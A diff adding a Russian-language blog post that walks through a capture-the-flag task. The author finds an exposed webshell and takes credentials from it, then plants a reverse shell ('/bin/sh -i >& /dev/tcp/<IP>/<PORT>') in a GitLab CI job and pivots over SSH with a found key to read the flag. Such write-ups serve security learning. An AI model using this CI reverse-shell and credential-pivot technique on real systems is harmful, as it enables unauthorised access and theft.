@@ -1,0 +1,117 @@
+---
+created: "14-09-2025"
+title: "Alfa CTF: Разработчик на пляже"
+author: Sviatoslav Murzin
+tags: ["medium"]
+---
+
+# Alfa CTF: Разработчик на пляже
+
+Всем хай, это первая задача alfa CTF, которую я решал и задача, где я заюзал reverse-shell
+
+Вот условие задачи:
+
+> У вашего коллеги не просто отпускное настроение — он нашёл для себя идеальный баланс: минимум усилий, максимум времени на пляже. Его подход прост: скорость важнее правил, удобство важнее безопасности, лучше собрать коллекцию ракушек, чем писать тесты. Такая философия оставляет заметные следы, и внимательный взгляд сможет превратить их в ключ к следующему флагу.
+>
+> Блог чиллового разработчика: secretshell-s6xix3a7.alfactf.ru/
+>
+
+Когда мы заходим на сайт, вот что мы видим:
+
+![website](/markdown/images/alfactf_secretshell_website.png)
+
+Читаем и понимаем, что это сайт с записками сумасшедшего... Чуваку надоела промышленная медленная разработка и пошел во все тяжкие, его можно понять, но это слишком жестко...
+
+Больше всего привлекает внимание его статья про вебшелл. Начинаем искать что-то, что могло быть спрятано от наших глаз: с самого начала я пытался найти какой-то аргумент в поисковой строке для RCE, но все попытки были тщетны.
+Потом я пытался запустить gobuster, чтобы найти какую-то директорию, но в итоге своими ручками решил пробить `/shell.php` и о чудо!
+
+![shell](/markdown/images/alfactf_secretshell_shell.png)
+
+
+Забираем с собой креды из `.env`, параллельно думая о великой силе скоростной разработки и как не странно догадаться следующим шагом заходим в гитлаб
+
+![gitlab](/markdown/images/alfactf_secretshell_gitlab.png)
+
+Тут лежит папка с проектом, далее я просто шерстим через весь гитлаб в поисках интересностей, но ничего кроме этого проекта и настроенной джобы не было
+
+Сразу появляется идея с reverse-shell'ом в gitlab runner, подготавливаем для этого почву: запускаем netcat, запускаем ngrok и создаём `.gitlab-ci.yml`
+
+```yml
+stages: 
+  – malicious 
+
+malicious: 
+  stage: malicious 
+  script: 
+    – /bin/sh -i >& /dev/tcp/<IP>/<PORT> 0>&1 `
+```
+
+где IP и PORT вытягиваются из запущенного ngrok'а 
+
+Запускаем pipeline и получаем в окне с netcat'ом reverse-shell
+
+```shell
+svetsec@svetsec-laptop:~$ nc -lvnp 4444
+Listening on 0.0.0.0 4444
+Connection received on 127.0.0.1 60258
+/bin/sh: 0: can't access tty; job control turned off
+$ ls
+README.md
+assets
+build
+index.php
+post-commit-directly-to-main.php
+post-disable-tests.php
+post-hardcode-secrets.php
+post-logging-off.php
+post-requirements-skim.php
+post-web-shell.php
+```
+
+Ну естественно исследуем все, что есть на этом гитлаб раннере, и... лично я долго не мог понять, что к чему и что и куда вообще тыкаться, прошел час, полтора и наконец-то набрел на файлик `.bash_history`, который дает очень хорошую подсказку касательно прода)))
+
+```shell
+$ cat .bash_history
+ssh -i ~/.ssh/id_rsa prod@production
+exit
+$ ssh -i ~/.ssh/id_rsa prod@production
+Pseudo-terminal will not be allocated because stdin is not a terminal.
+Host key verification failed.
+$ Pseudo-terminal will not be allocated because stdin is not a terminal.
+/bin/sh: 104: Pseudo-terminal: not found
+$ ssh -i ~/.ssh/id_rsa -T prod@production
+Host key verification failed.
+```
+
+Почему-то застопорился на ошибке с `Host key verification failed`, но быстро осознал, что надо создать файл `known_hosts` внутри папки `.ssh`, странно, почему меня утилита не спросила, хочу ли я добавить в `known_hosts`? Ну да ладно, идем дальше
+
+```shell
+$ ssh-keyscan production >> ~/.ssh/known_hosts
+# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
+# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
+# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
+# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
+# production:22 SSH-2.0-OpenSSH_10.0p2 Debian-7
+```
+
+И пробуем вновь...
+
+```shell
+$ ssh -T -i ~/.ssh/id_rsa prod@production
+Warning: Permanently added the ECDSA host key for IP address '172.25.136.2' to the list of known hosts.
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+ls
+flag.txt
+cat flag.txt
+alfa{.........................}
+```
+
+Флаг я зацензурил, он не так важен, не так ли?
+
+От задачки я очень сильно кайфанул, никогда еще не удавалось решать что-то связанное с reverse-shell'ом до этого момента, да и идея с тем, чтобы сделать это на раннере... Уфффф, очень хорошо.
